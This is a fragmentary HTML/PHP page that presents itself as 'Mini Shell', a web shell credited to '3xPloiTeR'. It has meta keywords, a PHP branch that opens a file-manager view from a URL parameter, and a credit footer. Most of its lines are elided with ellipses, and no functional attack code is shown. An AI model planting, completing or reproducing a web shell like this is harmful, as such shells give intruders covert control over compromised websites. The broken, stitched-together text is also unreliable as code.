...
<html>
	<head>
		...
		<meta charset="UTF-8" />
		<meta name="description" content="Mini Shell" />
       ...
       <meta name="keywords" content="An0n,Mini Shell,Mini,Shell,3xPloiTeR,Mini Shell 3xPloiTeR,Mini Shell" />
...
if (isset($_GET['file_manager'])) {echo '<!DOCTYPE HTML>
						...
						<BODY>
						<H1><center>mini shell File Manager</center></H1>
...
<html>
	...
	<body class="body">
		...
		<div class="footer">
			<font>Developed By <a href="https://www.google.com/search?q=mini shell">mini shell</a></font>
		</div>
	</body>
</html>